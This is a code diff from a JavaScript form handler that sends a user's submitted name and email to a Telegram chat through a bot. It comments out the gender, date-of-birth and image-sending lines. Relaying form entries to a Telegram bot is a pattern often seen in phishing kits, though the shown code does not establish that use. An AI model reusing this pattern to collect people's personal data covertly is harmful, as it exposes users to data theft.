@@ -494,14 +494,14 @@ function sendMessageToTelegram(botToken, chatId, messageText) {
             // Send to Telegram
             const message = `📝 **Form 1 Submitted - Personal Information**\n\n` +
                            `👤 Name: ${data.name}\n` +
-                           `👤 Gender: ${data.gender}\n` +
-                           `👤 Date of Birth: ${data.dob}\n` +
+                          // `👤 Gender: ${data.gender}\n` +
+                           //`👤 Date of Birth: ${data.dob}\n` +
                            `📧 Email: ${data.email}\n` +
                            `⏰ Time: ${new Date().toLocaleString()}`;
             
             sendMessageToTelegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, message);
 		
-			sendImageToTelegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
+			// sendImageToTelegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
         
                 showForm('form2');
             
